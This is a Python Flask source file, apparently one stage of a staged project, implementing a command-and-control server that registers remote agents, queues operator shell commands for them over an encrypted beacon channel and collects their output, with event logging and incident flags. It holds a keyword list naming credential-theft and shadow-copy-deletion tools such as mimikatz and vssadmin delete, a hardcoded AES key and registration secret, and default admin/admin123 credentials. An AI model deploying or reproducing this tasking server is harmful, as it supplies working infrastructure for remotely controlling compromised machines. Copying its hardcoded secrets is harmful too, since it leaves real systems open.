"""
SERVER — Stage 18 (Behavioral Stealth Detection + Event Engine)

Matches: agent/stages/stage18_Behavioral_stealth.go

What this adds:
- Event stream: every agent action fires a typed event
- Behavioral incident detection:
    * Beacon jitter anomaly
    * Task burst detection
    * Suspicious command pattern matching
- Risk score per agent based on open incidents
- RBAC: viewer/operator/admin roles
- This is the bridge to the full production server

Note: The complete production version is in server/server_with_event.py
"""

import base64, json, os, uuid, sqlite3, threading, time, secrets
from flask import Flask, request, jsonify, session, redirect, url_for
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime
from functools import wraps
import bcrypt

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

SECRET_KEY          = b"01234567890123456789012345678901"
REGISTRATION_SECRET = "shadownet-secret"
HEARTBEAT_TIMEOUT   = 30
JITTER_THRESHOLD    = 20    # seconds delta considered anomalous
TASK_BURST_COUNT    = 5
TASK_BURST_WINDOW   = 30    # seconds
DB_FILE             = "stage18.db"

SUSPICIOUS_CMDS = ["mimikatz", "net user", "vssadmin delete", "procdump", "gsecdump"]

# ── Crypto ─────────────────────────────────────────────────────

def encrypt(data):
    aes = AESGCM(SECRET_KEY); nonce = os.urandom(12)
    return base64.b64encode(nonce + aes.encrypt(nonce, json.dumps(data).encode(), None)).decode()

def decrypt(enc):
    raw = base64.b64decode(enc)
    return json.loads(AESGCM(SECRET_KEY).decrypt(raw[:12], raw[12:], None).decode())

# ── Database ────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.executescript('''
        CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT, role TEXT);
        CREATE TABLE IF NOT EXISTS agents (agent_id TEXT PRIMARY KEY, hostname TEXT, status TEXT, last_seen REAL);
        CREATE TABLE IF NOT EXISTS tasks (task_id TEXT PRIMARY KEY, agent_id TEXT, command TEXT, status TEXT, output TEXT, created_at TEXT);
        CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, event_type TEXT, details TEXT, timestamp TEXT);
        CREATE TABLE IF NOT EXISTS incidents (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, type TEXT, severity TEXT, status TEXT DEFAULT "open", created_at TEXT);
    ''')
    if not conn.execute("SELECT 1 FROM users WHERE username='admin'").fetchone():
        pw = bcrypt.hashpw(b"admin123", bcrypt.gensalt()).decode()
        conn.execute("INSERT INTO users VALUES ('admin', ?, 'admin')", (pw,))
    conn.commit(); conn.close()

# ── Event helpers ────────────────────────────────────────────────

def emit_event(agent_id, event_type, details=None):
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO events (agent_id, event_type, details, timestamp) VALUES (?,?,?,?)",
                 (agent_id, event_type, json.dumps(details or {}),
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()

def create_incident(agent_id, inc_type, severity):
    conn = sqlite3.connect(DB_FILE)
    # Deduplicate open incidents of same type
    if not conn.execute(
        "SELECT 1 FROM incidents WHERE agent_id=? AND type=? AND status='open'",
        (agent_id, inc_type)).fetchone():
        conn.execute("INSERT INTO incidents (agent_id, type, severity, created_at) VALUES (?,?,?,?)",
                     (agent_id, inc_type, severity, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        print(f"[!] INCIDENT [{severity}] {inc_type} on {agent_id}")
    conn.commit(); conn.close()

# ── In-memory state for detection ──────────────────────────────

_last_beacon_ts  = {}   # agent_id -> float
_task_timestamps = {}   # agent_id -> [float, ...]

# ── Auth ────────────────────────────────────────────────────────

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# ── Beacon ──────────────────────────────────────────────────────

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    now  = time.time()
    conn = sqlite3.connect(DB_FILE)
    row  = conn.execute("SELECT 1 FROM agents WHERE agent_id=?", (agent_id,)).fetchone()

    if not row:
        if payload.get("registration_secret") != REGISTRATION_SECRET:
            conn.close()
            return jsonify({"error": "unauthorized"}), 403
        conn.execute("INSERT INTO agents VALUES (?,?,?,?)",
                     (agent_id, payload.get("hostname", "?"), "online", now))
        emit_event(agent_id, "agent_connected")
    else:
        conn.execute("UPDATE agents SET status='online', last_seen=? WHERE agent_id=?",
                     (now, agent_id))
        emit_event(agent_id, "agent_heartbeat")

        # Jitter anomaly detection
        if agent_id in _last_beacon_ts:
            delta = now - _last_beacon_ts[agent_id]
            if delta > JITTER_THRESHOLD:
                create_incident(agent_id, "Beacon Jitter Anomaly", "MEDIUM")
        _last_beacon_ts[agent_id] = now

    if payload.get("ack"):
        conn.execute("UPDATE tasks SET status='ack' WHERE task_id=?", (payload["ack"],))
        emit_event(agent_id, "task_ack", {"task_id": payload["ack"]})

    if payload.get("output") and payload.get("task_id"):
        conn.execute("UPDATE tasks SET status='completed', output=? WHERE task_id=?",
                     (payload["output"], payload["task_id"]))
        emit_event(agent_id, "task_completed",
                   {"task_id": payload["task_id"], "output": payload["output"][:200]})
        print(f"\n[OUTPUT]\n{payload['output']}\n{'='*40}")

    # Next task
    row = conn.execute(
        "SELECT task_id, command FROM tasks WHERE agent_id=? AND status='queued' LIMIT 1",
        (agent_id,)).fetchone()
    task = None
    if row:
        task = {"id": row[0], "cmd": row[1]}
        conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (row[0],))
        emit_event(agent_id, "task_sent", {"task_id": row[0], "cmd": row[1]})

        # Burst detection
        ts_list = _task_timestamps.setdefault(agent_id, [])
        ts_list.append(now)
        _task_timestamps[agent_id] = [t for t in ts_list if now - t <= TASK_BURST_WINDOW]
        if len(_task_timestamps[agent_id]) >= TASK_BURST_COUNT:
            create_incident(agent_id, "Excessive Task Activity", "MEDIUM")

        # Suspicious command detection
        for kw in SUSPICIOUS_CMDS:
            if kw.lower() in row[1].lower():
                create_incident(agent_id, "Suspicious Command Pattern", "LOW")
                break

    conn.commit(); conn.close()
    return jsonify({"data": encrypt({"task": task})})

# ── Operator routes ─────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    data     = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "").encode()
    conn     = sqlite3.connect(DB_FILE)
    row      = conn.execute("SELECT password_hash, role FROM users WHERE username=?",
                            (username,)).fetchone()
    conn.close()
    if row and bcrypt.checkpw(password, row[0].encode()):
        session["username"] = username
        session["role"]     = row[1]
        return jsonify({"success": True, "role": row[1]})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/agents")
@login_required
def list_agents():
    conn = sqlite3.connect(DB_FILE)
    rows = conn.execute("SELECT agent_id, hostname, status, last_seen FROM agents").fetchall()
    conn.close()
    return jsonify([{"agent_id": r[0], "hostname": r[1],
                     "status": r[2], "last_seen": r[3]} for r in rows])

@app.route("/command", methods=["POST"])
@login_required
def queue_command():
    data = request.get_json()
    tid  = str(uuid.uuid4())
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO tasks VALUES (?,?,?,'queued',?,?)",
                 (tid, data["agent_id"], data["cmd"], None,
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    emit_event(data["agent_id"], "task_queued", {"task_id": tid, "cmd": data["cmd"]})
    return jsonify({"task_id": tid})

@app.route("/incidents")
@login_required
def list_incidents():
    conn = sqlite3.connect(DB_FILE)
    rows = conn.execute(
        "SELECT id, agent_id, type, severity, status, created_at FROM incidents ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return jsonify([
        {"id": r[0], "agent_id": r[1], "type": r[2],
         "severity": r[3], "status": r[4], "created_at": r[5]} for r in rows
    ])

@app.route("/events")
@login_required
def list_events():
    conn = sqlite3.connect(DB_FILE)
    rows = conn.execute(
        "SELECT agent_id, event_type, details, timestamp FROM events ORDER BY id DESC LIMIT 100"
    ).fetchall()
    conn.close()
    return jsonify([
        {"agent_id": r[0], "event_type": r[1],
         "details": json.loads(r[2]), "timestamp": r[3]} for r in rows
    ])

init_db()

if __name__ == "__main__":
    print("[*] Stage 18 server started — behavioral stealth detection")
    print("[*] Login: POST /login {username, password}")
    print("[*] Full production server → server_with_event.py")
    app.run(host="0.0.0.0", port=8080, debug=False)
